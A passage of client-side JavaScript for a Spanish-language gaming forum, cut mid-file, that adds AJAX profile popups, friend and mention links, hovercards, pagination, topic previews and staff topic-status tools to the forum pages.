                    e[i].classList.add('no_amigo');
                    e[i].getElementsByClassName('post_wall')[0].remove();
                }
            }
        },
        p_Sjx: function () {
            ops.t_pt = '1' == $.getby('.pagination')[0].childNodes[1].innerHTML;
            $.getby('.descargar');
            setTimeout(function () {
                $('#main').find('center').has('.fa-spin').remove()
            }, 300);
            ops.p_a(), ops.confirm(), ops.h_Tf();
        },
        h_Tf: function () {
            var a = $.getby('.contenido')[0];
            // si estoy en la pag 1 | si no hay paginacion | si hay descargas| si estas en soporte
            ops.t_pt || !ops.o_pt || ops.e_pt.length || ops.g_pt ? ops.a_pt.test(a.innerHTML) && (a.innerHTML = a.innerHTML.replace(ops.a_pt, '<span class="recprimtem"><i class="fa fa-thumb-tack"></i></span></br>'), $.getby('.recprimtem')[0] && ops.p_Fi[0].classList.add('el_primero')) : ops.p_Fi[0].remove();
        },
        auT_t: tm && $.getby('.author-titulo')[0],
        f_tmT: function () {
            var a = $.getby('.i_post'),
                c = ops.soy_staff,
                d = ops.soy_user,
                e = ops.mi_nombre,
                f = ops.autor_tema,
                g = '<a style="color: rgb(221, 84, 1); text-shadow: 0 1px rgba(255, 255, 255, 0.48); font-size: 14px; vertical-align: middle;" href="/search.forum?search_id=favouritesearch&add_favourite=' + ops.id_tema + '" onclick="ops.start_Ncontent(\'pl_a4\',this); return false" original-title="Añadir a favoritos"><i class="fa fa-bookmark"></i></a><i id="resuelto_ajax" class="fa fa-check-circle" style="text-indent:5px;cursor:pointer;font-size:16px;text-shadow:none;vertical-align:middle;color:rgb(154, 205, 50);display:none" value="[Resuelto]" onclick="ops.mod_12(this)"></i>';
            ops.auT_t.insertAdjacentHTML('beforeend', g);
            if (c && /\/post\?f=14/g.test(a[0].href) || d && e === f && /\/post\?f=14/g.test(a[0].href)) {
                $.getby('#resuelto_ajax').style.display = 'inline-block';
            }
        },
        me: function () {
            var me = $.getby('.nick');
            for (var t = 0; t < me.length; t++) {
                var d = me[t].textContent;
                if (d === ops.mi_nombre) {
                    me[t].parentNode.parentNode.parentNode.classList.add('me')
                }
            }
        },
        p_a: function () {
            var a = $.getby('.f_a3'),
                b = $.getby('.perfil_a');
            for (var i = 0; i < a.length || i < b.length; i++) {
                a[i].children[0].setAttribute('onclick', 'ops.dom_p_ajax(\'perfil\',this);return false');
                b[i].children[0].setAttribute('onclick', 'ops.dom_p_ajax(\'perfil\',this);return false');
            }
        },
        dom_p_ajax: function (d, c) {
            c.parentNode.parentNode.parentNode.parentNode.parentNode.classList.add('perfil_activo');
            var e, f, g, h, l = $.getby('.perfil_activo')[0].getElementsByClassName('author')[0].children[1].textContent,
                s = $.getby('.perfil_activo')[0].getElementsByTagName('figure')[0].children[0].children[0].src,
                u = c.href,
                g = 'position: relative; height: 30px; border: 1px solid; width:100.4%; margin-left: -3px; margin-top: 3px; background: rgb(63, 76, 107);',
                a = document.createElement('DIV');
            document.body.appendChild(a);
            a.id = 'profcont-container';
            a.style = 'background:rgb(255, 255, 255);top:20%;left:15%;right:15%;padding:4px;position:fixed;font-size:12px;-border-radius:5px;box-shadow:0px 0px 2px rgba(0,0,0, 0.5) inset;z-index:500';
            a.innerHTML = '<div class="profile_popup_nav"><span class="propop_tab" id="propop_vm" onclick="ops.tabs_p_ajax(\'wall\',this);">Muro</span><span class="propop_tab activeTab" id="propop_profile" onclick="ops.tabs_p_ajax(\'perfil\',this);">Perfil</span><span class="propop_tab" id="propop_stats" onclick="ops.tabs_p_ajax(\'stats\',this);">Estadisticas</span><span class="propop_tab" id="propop_friends" onclick="ops.tabs_p_ajax(\'friends\',this);">Amigos</span><span class="propop_tab" id="propop_contact" onclick="ops.tabs_p_ajax(\'contact\',this);">Contacto</span><span class="propop_tab" id="close_popup" style="float:right;margin-top:-4px;" onclick="ops.tab_close();">Cerrar</span><div id="perfil_ajax_info" style="' + g + '"><div id="userAVA"><a href="' + u + '"><img src="' + s + '"></a></div><strong>' + l + '</strong></div></div><div id="userprofile"></div><span id="profileLinks"><a href="' + u + '">Ver perfil completo</a>';
            d = '';
            ops.tabsp_ajax(d);
            ops.back();
            $.getby('#userprofile').innerHTML = ops.ajax_load;
        },
        tabs_p_ajax: function (d, c) {
            var b = $.getby('#userprofile'),
                e = $.getby('.activeTab');
            switch (b.innerHTML = ops.ajax_load, e[0].classList.remove('activeTab'), c.classList.add('activeTab'), d) {
            case 'perfil':
                d = '';
                ops.tabsp_ajax(d);
                break;
            case 'wall':
                ops.tabsp_ajax(d);
                break;
            case 'stats':
                ops.tabsp_ajax(d);
                break;
            case 'friends':
                ops.tabsp_ajax(d);
                break;
            case 'contact':
                ops.tabsp_ajax(d);
                break;
            }
        },
        tab_close: function () {
            $.getby('#profcont-container').remove();
            $.getby('.perfil_activo')[0].classList.remove('perfil_activo');
            ops.back_close();
        }, //variables
        tabsp_ajax: function (e) {
            var j, f, g, h, i, j, k, t = $.getby('#profileLinks').getElementsByTagName('a')[0].href
            console.log('update_perfil_ajax:' + e), $.get(t + e, function (e) {
                var t = $('#cp-main .panel', e)[0].innerHTML;
                $.getby('#userprofile').innerHTML = t;
            }).done(function () {
                f = $.getby('.activeTab')[0];
                g = $.getby('#userprofile').getElementsByClassName('inner')[0];
                h = $.getby('#perfil_ajax_info');
                i = $.getby('.field_uneditable').length && ($.getby('.field_uneditable')[1].textContent);
                j = '<div class="img_ajax_p" style="width:100.1%;border:1px solid #2D2C2C;margin:0 auto;display:table;margin-top:3px;margin-left:-1px;height:81px;background:url(' + i + ');background-size:220px;">';
                k = $.getby('.img_ajax_p');
                f.textContent == 'Amigos' ? (g.classList.add('amigos'), $('#userprofile ol > li').addClass('member_box')) : f.textContent == 'Muro' && (g.classList.add(e)), (f.textContent == 'Perfil' && !k.length) && (h.insertAdjacentHTML('beforeend', j), $.getScript('http://adictosalgear.org/js/edit_c_ajx.js'))
            })
        },
        scroll_all: function () {//pensar como hacerlo sin jquery
            $(window).scroll(function () {
                $(this).scrollTop() > 100 ? ($('.scrollToTop').fadeIn(), $('.scrollToDown').fadeOut()) : ($('.scrollToTop').fadeOut(), $('.scrollToDown').fadeIn())
            });
        },
        up_s: function (c) {
            $('html, body').animate({
                scrollTop: 0
            }, 800), !1
        },
        dw_s: function (c) {
            $('html,body').animate({
                scrollTop: $('.navbar.bottom').offset().top
            }, 2e3)
        },
        sin_req: function () {
            var i, j, k, s, a = $.getby('.descargar'),
                b = $.getby('.pbutton1'),
                c = $.getby('.content')[0],
                d = '<div class="fa_hello"><i class="fa fa-tachometer" aria-hidden="true"></i> Para ver los códigos debes tener al menos 6 comentarios en el foro<br><div id="ultjava"><p style="font-size:12px;color:rgb(0, 0, 0);margin-bottom:0!important;">Puedes comentar en estos temas:</p></div></div>';
            if (a.length && _userdata.user_posts < 5) {
                for (i = 0; i < b.length; i++) {
                    b[i].removeAttribute('onclick');
                    b[i].style = 'width:200px';
                    b[i].textContent = 'Debes tener 6 comentarios';
                }
                c.insertAdjacentHTML('afterbegin', d);
                $.get('/feed/?f=8', function (e) {
                    for (8 < $('title', e).length ? s = 8 : s = $('title', e).length, i = 2; i < s; i++) {
                        j = $('link', e)[i].textContent;
                        k = $('title', e)[i].textContent;
                        $.getby('#ultjava').innerHTML += '<a href="' + j + '"><i class="fa fa-circle" aria-hidden="true" style="font-size:12px"></i> ' + k + '</a><br/>';
                    }
                }).done(function () {
                    ops.prefijos_all_add()
                });
            } //convertir
            a.length && $(ops.post_dom).has('.descargar').find('.quote').remove()
        },
        add_amigos_post: function () {
            if (!_userdata.session_logged_in) return !1;
            var d, l, f = [],
                g, h, i, j, k,
                b = $.getby('.post'),
                c = b.length;
            $.get('/profile?mode=editprofile&page_profil=friendsfoes').success(function (e, t, o) {
                if (200 === o.status) {
                    l = $('.panel:eq(1) .friends-foes-list a[href^="/u"]', e);
                    for (i = 0; i < l.length; i++) {
                        f[f.length] = l[i].textContent;
                    }
                    for (i = 0; i < c; i++) {
                        h = b[i],
                            j = 'undefined' != typeof h.getElementsByClassName('nick').length && h.getElementsByClassName('nick')[0],
                            d = j.textContent.match(/(\w.+)/g)[0];
                        k = j.children[0].href.match(/\d+/g)[1];
                        if (d !== ops.mi_nombre) {
                            g = h.getElementsByClassName('frds')[0];
                            if (-1 == f.indexOf(d)) {
                                g.innerHTML = '<a class="add_friends" onclick="ops.add_frs(this);return false" href="/profile?friend=' + d + '&mode=editprofile&page_profil=friendsfoes"><i class="fa fa-plus-circle"></i> Añadir a mi lista de amigos</a>';
                            } else {
                                g.innerHTML = '<a class="delete_friend" href="/profile?mode=editprofile&page_profil=friendsfoes&remove=' + k + "&u=" + k + '" onclick="ops.add_frs(this);return false"><i class="fa fa-minus-circle"></i> Eliminar de mi lista de amigos</a>';
                            }
                        }
                    }
                }
                ops.r_wA()
            })
        },
        add_frs: function (r) {
            var t = r.href;
            $.get(t).success(function () {
                r.textContent.match(/(\w.+)/g)[0] == 'Añadir a mi lista de amigos' ? r.textContent = 'Solicitud enviada' : r.textContent = 'Ya no eres mi amigo'
            }).error(function () {
                $.boxes('alert', 'Fallo, intentalo de nuevo')
            })
        },
        mencionar: function () {
            var i, d, e, f, g, h, a = $.getby('.author'),
                b = $.getby('.nick');
            for (i = 0; i < a.length || i < b.length; i++) {
                d = a[i].innerHTML.indexOf('fa-at') < 0 || b[i].innerHTML.indexOf('fa-at') < 0;
                e = a[i].textContent.match(/\S+/g)[0] || b[i].textContent.match(/\S+/g)[0];
                g = '<i class="fa fa-at"></i>';
                if (d) {
                    f = a[i].getElementsByTagName('a')[0];
                    h = b[i].getElementsByTagName('a')[0];
                    f.setAttribute('title', 'Mencionar a ' + e);
                    f.setAttribute('onclick', 'ops.men_func(this);return false');
                    h.setAttribute('title', 'Mencionar a ' + e);
                    h.setAttribute('onclick', 'ops.men_func(this);return false');
                    a[i].getElementsByTagName('strong')[0].insertAdjacentHTML('afterbegin', g);
                    b[i].getElementsByTagName('strong')[0].insertAdjacentHTML('afterbegin', g);
                }
            }
        },
        men_func: function (e) {
            var a = e.textContent.match(/\S+/g)[0],
                b = ops.textarea.value;
            ops.start('reply', e, ops.url_reply);
            ops.textarea.focus();
            ops.i_a_subjet = '[Mensaje automático]: Te he mencionado en: ' + ops.topic_name,
                ops.i_a_message = '[quote]Hola {USERNAME}, Te he mencionado en :[url=' + window.location + ']' + ops.topic_name + '[/url] \n ' + b + '[/quote]', ops.i_a_usename = a;
            ops.i_a();
            ops.textarea.value += '@' + a + ' '
        },
        pF_In: function () {
            var usersinfo = {};
            $('.lastpost').find('a[href^="/u"]').tooltipster({
                animation: 'fade',
                interactive: true,
                contentAsHTML: true,
                minWidth: 300,
                maxWidth: 300,
                delay: 500,
                arrowColor: "#086594",
                autoClose: true,
                content: 'Cargando...',
                functionBefore: function (origin, continueTooltip) {
                    continueTooltip();
                    var c, a = $(this).attr('href').match(/\d+/g)[0],
                        b = $(this).text(),
                        e = $.getby('.tooltipster-content')[0];
                    console.log('nombre:' + b);
                    if (!Cookies.get('banner_src' + b)) {
                        $.get('/u' + a).success(function (o) {
                            c = $('#field_id3 .field_uneditable', o)[0].textContent;
                            Cookies.set('banner_src' + b, c, {
                                expires: 1
                            })
                        })
                    }
                    if (origin.data('ajax') !== 'cached') {
                        if (usersinfo[a] != undefined) {
                            origin.tooltipster('content', usersinfo[a]).data('ajax', 'cached');
                            e.style = 'background-image:url(' + Cookies.get('banner_src' + b) + ');background-size:100%';
                            console.log('cache hovercard banner')
                        } else {
                            $.get('/ajax/index.php?f=m&user_id=' + a, function (html) {
                                usersinfo[a] = html;
                                origin.tooltipster('content', html).data('ajax', 'cached');
                                setTimeout(function () {
                                    ops.banner_indice(e, b)
                                }, 1000);
                            })
                        }
                    } else {
                        ops.banner_indice(e, b);
                        console.log('usando banner en hovercard cache')
                    }
                }
            });
        },
        tooltipster_init: function () {
            var usersinfo = {};
            $('.mentiontag').tooltipster({
                animation: 'fade',
                interactive: true,
                contentAsHTML: true,
                minWidth: 300,
                maxWidth: 300,
                delay: 500,
                arrowColor: "#086594",
                autoClose: true,
                content: 'Cargando...',
                functionBefore: function (origin, continueTooltip) {
                    continueTooltip();
                    var c, a = $(this).attr('href').match(/\d+/g)[0],
                        b = $(this).text(),
                        e = $.getby('.tooltipster-content')[0];
                    console.log('nombre:' + b);
                    if (!Cookies.get('banner_src' + b)) {
                        $.get('/u' + a).success(function (o) {
                            c = $('#field_id3 .field_uneditable', o)[0].textContent;
                            Cookies.set('banner_src' + b, c, {
                                expires: 1
                            })
                        })
                    }
                    if (origin.data('ajax') !== 'cached') {
                        if (usersinfo[a] != undefined) {
                            origin.tooltipster('content', usersinfo[a]).data('ajax', 'cached');
                            e.style = 'background-image:url(' + Cookies.get('banner_src' + b) + ');background-size:100%';
                            console.log('cache hovercard banner')
                        } else {
                            $.get('/ajax/index.php?f=m&user_id=' + a, function (html) {
                                usersinfo[a] = html;
                                origin.tooltipster('content', html).data('ajax', 'cached');
                                setTimeout(function () {
                                    ops.banner_indice(e, b)
                                }, 1000);
                            })
                        }
                    } else {
                        ops.banner_indice(e, b);
                        console.log('usando banner en hovercard cache')
                    }
                }
            })
        },
        stars: function () {
            var a = $.getby('.vote');
            for (var t = 0; t < a.length; t++) {
                var e = a[t].getElementsByClassName('likecount')[0].textContent.match(/[0-9]+/),
                    b = '<i class="fa fa-star"></i>',
                    o = 'color:rgb(255, 255, 0);font-size:18px;font-weight:bold;margin:-6px -106px 10px;padding:0px;text-align:center;position:absolute;';
                e >= 3 && a[t].insertAdjacentHTML('afterbegin', '<p class="popular_post" style="' + o + '">' + b + '</p>');
                e >= 6 && a[t].insertAdjacentHTML('afterbegin', '<p class="popular_post" style="' + o + '">' + b + b + b + '</p>');
                e >= 10 && a[t].insertAdjacentHTML('afterbegin', '<p class="popular_post" style="' + o + '">' + b + b + b + b + b + '</p>');
            }
        },
        temas_cerrado: function () {
            var a = $.getby('#url_a_t'),
                b = 'position: absolute; margin-top: -240px; font-size: 90px; margin-left: 10px; color: rgb(255, 0, 8); text-shadow: 0 -1px rgb(255, 255, 255),0 1px rgb(255, 255, 255),1px 0 rgb(255, 255, 255),-1px 0 rgb(255, 255, 255)',
                c = 'background:url(' + ops.lang.l_iM + ')rgba(237,36,20,0.35)',
                d = $.getby('.titulo-tema')[0],
                e = $.getby('.pbutton1')[0];
            a.getAttribute('alt').indexOf('cerrado') >= 0 && (d.classList.add('lock-theme'), d.style = c, d.insertAdjacentHTML('afterbegin', '<i class="fa fa-lock" style="' + b + '"></i>'), e.removeAttribute('onclick'), e.textContent = 'Tema Cerrado')
        },
        mN_L: function () {
            var a = $.getby('.plusmenu'),
                b = a.length;
            b && a[0].remove()
        },
        n_frT: function () {
            var i, c, d, a = $.getby('.pathname-box'),
                b = '<i class="fa fa-home" style="font-size: 34px;"></i>';
            if (a)
                for (i = 0; i < a.length; i++)(a[i].innerHTML = a[i].innerHTML.replace(/::/g, ''), a[i].getElementsByClassName('nav')[0].innerHTML = b);
            $(window).load(function () {
                ops.aV_x();
                ops.stars();
            })
        },
        i_Wf: function () {
            var e = $.getby('a');
            for (var t = 0; t < e.length; t++) {
                if (/\?unwatch=forum/gi.test(e[t].href)) {
                    e[t].innerHTML = ops.lang.unwatchBTNs, e[t].title = 'Dejar de vigilar este subforo';
                    e[t].className = 'tnvig-tem', e[t].setAttribute('onclick', 'ops.uwF_Sb(this); return false')
                } else if (/\?watch=forum/gi.test(e[t].href)) {
                    e[t].innerHTML = ops.lang.watchBTNs, e[t].title = 'vigilar este subforo';
                    e[t].className = 'tnvig-tem';
                    e[t].setAttribute('onclick', 'ops.uwF_Sb(this);return false');
                }
            }
        },
        pag_ajx_sub: function () {
            var a = $.getby('.pag_ajax'),
                b = a[0].getElementsByClassName('page-sep').length;
            if (b) {
                for (var t = 0; t < a.length; t++) {
                    var e = a[t].getElementsByTagName('span')[0].getElementsByTagName('a');
                    for (var i = 0; i < e.length; i++) {
                        console.log(e[i].href);
                        e[i].setAttribute('onclick', 'ops.p_sub_x(this);return false')
                    }
                }
            }
        },
        p_sub_x: function (c) {
            var e = $.getby('.pag_ajax'),
                href = c.href;
            ops.back_jx();
            $.get(href, function (o) {
                $.getby('.bg_none')[0].innerHTML = $('.bg_none', o)[0].innerHTML;
                e[0].innerHTML = $('.pag_ajax', o)[0].innerHTML;
                e[1].innerHTML = $('.pag_ajax', o)[1].innerHTML;
            }).success(function () {
                ops.r_Sb();
                ops.back_close();
                ops.pag_ajx_sub();
            });
        },
        pathSub: function () {
            var a = $.getby('.nomargin'),
                b = $.getby('.nav')[0];
            if (a.length) {
                for (var t = 0; t < a.length; t++) {
                    a[t].innerHTML = a[t].innerHTML.replace(/::/g, '');
                }
            }
            b.innerHTML = '<i class="fa fa-home" style="font-size: 34px;"></i>';
        },
        e_CTm: function (c) {
            var b, d, g, h, j, a = c.parentNode.getElementsByClassName('topictitle')[0],
                i = a.href;
            console.log('url edit:' + i);
            $.get(i, function (e) {
                b = $('.editar:first a', e)[0].href,
                    j = $('.editar:first a', e)[0].href.match(/\d+/g)[1];
                console.log('edite path:' + j + b);
                $.get(b, function (f) {
                    d = $('.titulo_del_post', f)[0];
                    g = d.value.match(/\[(.*?)\]/) ? d.value.replace(/\[(.*?)\]/, '[En curso]') : d.value;
                    h = $('#editor-textarea', f)[0].value;
                    $.post('/post', {
                        p: j,
                        mode: 'editpost',
                        subject: g,
                        message: h,
                        edit_reason: '',
                        attach_sig: '1',
                        notify: '1',
                        post: 'Enviar',
                        topictype: $('input[name="topictype"]:checked', f).length && ($('input[name="topictype"]:checked', f)[0].value)
                    }).done(function () {
                        a.getElementsByClassName('ayuda')[0].classList.add('en-curso');
                        a.getElementsByClassName('ayuda')[0].classList.remove('ayuda');
                        a.getElementsByClassName('en-curso')[0].textContent = 'En curso';
                    })
                })
            })
        },
        r_Sb: function () {
            $.getby('#main').classList.add('subs-cat'), ops.aV_Sb(), ops.i_Wf(), ops.a_HSb(), ops.load_subs();
            $.cachedScript('http://www.adictosalgear.org/js/tooltips_sub.js').done(function () {
                ops.e_CTm_i();
                setTimeout(ops.m_rSb(), ops.mI_Sb(), 300)
            })
        },
        prev_sub: function (c) {
            var b, d, e, f, a = $.getby('#topicPreviewing'),
                g = c.parentNode.getElementsByClassName('topictitle')[0].href,
                h = $.getby('#topicPreview-container');
            c.innerHTML = ' <i class="fa fa-spinner fa-pulse fa-1x fa-fw"></i><b style="font-family:monda;font-size:10px;display:inline-block"> Cargando...</b>';
            $.get(g, function (s) {
                var b = $('.post .content', s)[0].innerHTML,
                    d = $('.post .nick', s)[0].innerHTML,
                    e = $('.post figure', s)[0].innerHTML,
                    f = $('.post', s).find('.nombre-tema').html();
                a.getElementsByClassName('content')[0].innerHTML = BB.parse(b);
                a.getElementsByTagName('figure')[0].innerHTML = e;
                a.getElementsByClassName('nick')[0].innerHTML = d;
                a.getElementsByClassName('nombre-tema')[0].innerHTML = f;
            }).done(function () {
                prefijos_all.initialize();
                ops.imgauto();
                $._fadeIn(h, 200);
                c.innerHTML = ''
                ops.back();
                $.getby('#close_prvpopup').onclick = function () {
                    ops.back_close(h);
                }
            });
        },
        a_HSb: function () {
            '/f15-zona-beta' === ts ? ops.aHtml = ops.lang.beta : '/f13-staff' === ts ? ops.aHtml = ops.lang.staff : '/f14-soporte' === ts ? ($.getby('#wrap').classList.add('support'), ops.aHtml = ops.lang.support) : '/f10-evaluaciones' === ts ? ops.aHtml = ops.lang.evaluaciones : /^\/f(4|5|6|34|7|11|12)(p[0-9]+)?-/.test(document.location.pathname) && (ops.aHtml = ops.lang.codigos), 0 == !ops.aHtml && ops.a_Sb(ops.aHtml)
        },
        a_Sb: function (c) {
            var a = document.createElement('li'),
                b = $.getby('.row2')[0],
                d = b.parentNode;
            d.insertBefore(a, b);
            a.innerHTML = c;
        },
        uwF_Sb: function (c) {
            var a = c.href,
                b = /\?watch=forum/gi.test(c.href),
                d = b ? ' dejo de vigilar el subforo: ' : ' esta vigilando el subforo: ';
            c.insertAdjacentHTML('afterbegin', '<i style="color:#000;font-size:14px;"class="fa fa-spinner fa-spin"></i>');
            $.post(a, {
                confirm: 1
            }).success(function () {
                c.href = b ? window.location.href + '?unwatch=forum' : window.location.href + '?watch=forum';
                c.innerHTML = b ? ops.lang.unwatchBTNs : ops.lang.watchBTNs;
                ops.Nacti_msg = ops.mi_nombre + d + '[url=' + window.location.href + ']' + document.title + '[/url]';
                ops.Na();
            })
        },
        e_CTm_i: function () {
            if ('/f14-soporte' === ts && ops.soy_staff) {
                var a = $.getby('.topictitle'),
                    b = 'margin-left: 3px; color: rgb(255, 0, 0); vertical-align: text-top; font-size: 12px; cursor: pointer; margin-right: 0; margin-top: 1px';
                for (var i = 0; i < a.length; i++) {
                    a[i].insertAdjacentHTML('afterend', '<i class="fa fa-history" style="' + b + '" onclick="ops.e_CTm(this)"></i>')
                }
            };
            if (/f12/.test(window.location) && sub && ops.soy_staff) {
                var a = $.getby('.topictitle'),
                    b = 'margin-left: 3px; color: rgb(255, 0, 0); vertical-align: text-top; font-size: 12px; cursor: pointer; margin-right: 0; margin-top: 1px';
                for (var i = 0; i < a.length; i++) {
                    a[i].insertAdjacentHTML('afterend', '<i class="fa fa-bomb" style="' + b + '" onclick="ops.e_CTm_w(this)"></i>')
                }
            }
        },
        adds: function () {
            try {
                var a = $.getby('.row');
                for (var i = 0; i < a.length; i++) {
                    a[i].getElementsByClassName('icon')[0].removeAttribute('style');
                }
            } catch (a) {
                'undefined' != typeof console && console.error(a)
            }
        },
        fV_Sb: function () {
            var b, c, d, e, f, i, a = $.getby('.topictitle'),
                l = a.length;
            if (l && ops.logout) {
                for (i = 0; i < l; i++) {
                    b = a[i].parentNode.parentNode.parentNode.parentNode.getElementsByClassName('views')[0].textContent.match(/\d+/)[0];
                    c = a[i].parentNode.getElementsByClassName('s_g_t_h')[0];
                    d = a[i].textContent;
                    e = '&nbsp&nbsp<i class="fa fa-fire popular_post" title="Tema leído ' + b + ' veces" style="color:rgb(27, 127, 204);"></i>';
                    f = 'http://www.google.com/search?q=' + escape('site:' + document.location.host + ' ' + d)
                    b >= 1e3 && (a[i].insertAdjacentHTML('afterend', e));
                    c.setAttribute('href', f);
                    a[i].parentNode.getElementsByClassName('favblog')[0].setAttribute('onclick', 'ops.fav_subs_f(this);return false')
                }
            }
            ops.adds();
        },
        fav_subs_f: function (c) {
            var a = c.parentNode.getElementsByClassName('topictitle')[0].href.match(/[^t]\d+/g)[1],
                b = '/search?add_favourite=' + a + '&search_id=favouritesearch',
                d = c.parentNode.getElementsByClassName('topictitle')[0].textContent;
            console.log('id:' + a + 'url:' + b + 'tit:' + d);
            $.get(b).success(function (e) {
                $.boxes('alert', 'Se añadio correctamente: ' + d + ' a tu lista de favoritos')
            }).error(function () {
                $.boxes('alert', 'Fallo al agregar el tema' + d)
            });
        },
        load_subs: function () {
            $('#info_open').nextAll().remove();
            var e = $.getby('.row');
            for (var i = 0; i < e.length; i++) {
                var f = e[i].getElementsByClassName('type'),
                    o = e[i].getElementsByTagName('img')[0],
                    a = '<span class="prefijo naglob">Anuncio global</span>',
                    b = '<span class="prefijo nota">Sticky</span>',
                    c = '<span class="prefijo anuncio" >Anuncio</span>',
                    d = '<span class="prefijo anuncio" >Anuncio</span>';
                e[i].classList.contains('Global') && (f[0].innerHTML = a);
                e[i].classList.contains('Nota') && (f[0].innerHTML = b);
                e[i].classList.contains('Anuncio') && (f[0].innerHTML = c);
                e[i].classList.contains('Anuncio') && (f[0].innerHTML = d);
                o.alt == 'Has posteado en este tema.' && (o.outerHTML = '✔')
            }
            var s = $.getby('strong'),
                l = s.length;
            for (var i = 0; i < l; i++) {
                if (s[i].textContent.indexOf('[ Sondeos ]') >= 0) {
                    s[i].innerHTML = '<span class="prefijo votaciones" >votaciones</span>';
                    s[i].parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.classList.add('sondeos')
                }
            }
            var posts = $.getby('.posts'),
                r = posts.length;
            if (r) {
                for (var i = 0; i < r; i++) {
                    posts[i].style = 'display:none!important'
                }
            }
        },
        add_ind: function () {
            var a = $.getby('.last-post-icon'),
                b, c, e,h, d = '<span class="gensmall showpages" style="position: absolute; margin-left: 187px; margin-top: 2px; font-size: 9px;"><i class="fa fa-file-text"></i> Ir a la página: ';
            for (var i = 0, len = a.length; i < len; i++) {
                b = /(\/t[0-9]+)p([0-9]+)-/.exec(a[i]);
                if (b) {
                    c = a[i].parentNode.parentNode.parentNode.parentNode.childNodes[0];
                    ops.temp = d + '<a href="' + b[1] + '-">1</a>, ';
                    e = b[2] / 10;
                    if (e > 3) {
                        ops.temp += '<a href="' + b[1] + 'p' + 10 + '-">2</a>, ... ' + '<a href="' + b[1] + 'p' + (b[2] - 10) + '-">' + e + '</a>, ' + '<a href="' + b[1] + 'p' + b[2] + '-">' + (e + 1) + '</a>, ';
                    } else {
                        for (var j = 0; j < e; j++) {
                            ops.temp += '<a href="' + b[1] + 'p' + ((j + 1) * 10) + '-">' + (j + 2) + '</a>, ';
                        }
                    }
                    ops.temp = ops.temp.slice(0, -2) + ' </span>';
                    c.insertAdjacentHTML('beforeend', ops.temp);
                }
            };
             h = $.getby('.hierarchy');
            for (var i = 0, l = h.length; i < l; i++) {
                var y = h[i].firstChild.href,
                    z = y.replace(/.*f(\d+)-.*/, '$1'),
                    x = '<span><div id="crear_tema" original-title="Crear un tema"><a rel="nofollow" onclick="ops.error_aac(' + z + ');return false" class="index_nwpost" href="'+ y +'"><i class="fa fa-plus-square"></i> Nuevo Tema</a></div></span>';
                h[i].parentNode.parentNode.parentNode.parentNode.insertAdjacentHTML('beforeend', x);
            }
        },
        error_aac: function (c) {
            var a = '/post?f=' + c + '&mode=newtopic';
            $.get(a).success(function (s) {
                if ($('.error', s)[0].innerHTML.indexOf('Lo sentimos') >= 0) {
                    $.boxes('alert', 'Lo sentimos pero solo los usuarios con acceso especial pueden publicar temas en este foro');
                    return false
                } else {
                    location.replace(a)
                }
            })
        },
        banner_indice: function (e, b) {
            e.style = 'background-image:url(' + Cookies.get('banner_src' + b) + ');background-size:100%';
            console.log('ajax hovercard banner:' + Cookies.get('banner_src' + b))
        },
        iP_wL: function () {
            var a = $.getby('#avac_status_textarea');
            if (a) {
                a.placeholder = ops.mi_nombre + ' publica un nuevo mensaje...';
                a.onclick = function () {
                    a && (window.onbeforeunload = function () {
                        if (a.value.length) {
                            return ops.mi_nombre + ' todavía no has enviado el mensaje.'
                        }
                    });
                    this.style.height = '150px';
                    this.onblur = function () {
                        this.style.height = '15px'
                    }
                };
            }
        },
        rE_Fi: function () {
            ops.sub_ind_funciones(), ops.add_ind(), ops.prefijos_all_add(), ops.pF_In();
            if (0 === _userdata.user_level) {
                var row = $.getby('.row');
                for (var i = 0; i < row.length; i++) {
                    if (row[i].textContent == 'Staff') {
                        row[i].classList.add('staff');
                        row[i].getElementsByClassName('forumtitle')[0].onclick = function () {
                            $.boxes('alert', 'Foro destinado al staff');
                            return false
                        };
                    }
                }
            }
            $('.log-in').contents().filter(function () {
                return 3 === this.nodeType
            }).remove();
            ops.QTips();
            console.log('funciones reload up')
        },
        reload: function () {
            var e = (new Date).getHours() + ':' + ((new Date).getMinutes() < 10 ? '0' + (new Date).getMinutes() : (new Date).getMinutes()),
                t = (new Date).getDate() + '/' + ((new Date).getMonth() + 1 < 10 ? '0' + ((new Date).getMonth() + 1) : (new Date).getMonth() + 1) + '/' + ((new Date).getFullYear() - 2e3);
            $.when($.get('/forum', function (e) {
                var t = $('.informacion .totaluser', e)[0].innerHTML,
                    o = $('.informacion .log-in', e)[0].innerHTML,
                    a = $('.index-box .inner', e)[0].innerHTML,
                    i = $('.index-box .inner', e)[1].innerHTML;
                ops.ind_b[0].children[0].innerHTML = a, ops.ind_b[1].children[0].innerHTML = i, ops.tot_u.innerHTML = t, ops.log_i.innerHTML = o;
            }).success(function () {
                ops.rE_Fi(), ops.actividad(), ops.loadwall(), ops.r_LcL();
                console.log('%c--------------> recargado:' + e + ', ' + t, colors.red)
            }))
        },
        last_user_fix: function () {
            var A = $.getby('.last_user_index')[0].children[0];
            if ($('.actividad').find('.message-text').text().indexOf('es nuevo en el foro') != -1 && Cookies.get('lastuser')) {
                Cookies.remove('lastuser')
            }
            '' == A.textContent && !Cookies.get('lastuser') && $.get('/statistics', function (e) {
                var t = $('.forumline.values:eq(1) a[href*="/u"]', e)[0].textContent;
                Cookies.set('lastuser', t), A.textContent = t, console.log('ultimo usuario ajax')
            }), '' === A.textContent && Cookies.get('lastuser') && (A.textContent = Cookies.get('lastuser'), console.log('ultimo usuario galleta'))
        },
        cArT_: function () {
            var e = $.getby('.avatar');
            if (e.length)
                for (var i = 0; i < e.length; i++) /\/u(\d+)$/g.test(e[i].children[0].href) && (e[i].children[0].href = e[i].children[0].href + 'wall')
        },
        loadwall: function () {
            var e, f, a = $.getby('#profile-advanced-details2'),
                b = $.getby('.wiaag'),
                c = $.getby('#edwaag'),
                d = b[0].getElementsByClassName('fa-spinner');
            if (!ops.logout) {
                a && (a.children[0].style = 'display: table;margin: 30% auto 0px;color:#fff');
                d.length && (d[0].remove());
                c && (c.remove())
            } else {
                $.get('u' + ops.mi_id + 'wall', function (o) {
                    e = $('ol', o)[0].innerHTML;
                    b[0].innerHTML = e;
                }).success(function (t) {
                    f = $.getby('.message-block');
                    if (0 === f.length) {
                        a.innerHTML = ops.lang.no_wallpost;
                    }
                    for (var i = 0; i < f.length; i++) {
                        var a = f[i].getElementsByClassName('sprite-icon_post_target_unread');
                        a.length && f[i].classList.add('new_post_wall');
                    }
                    BBcode();
                    ops.cArT_();
                    //loop aqui
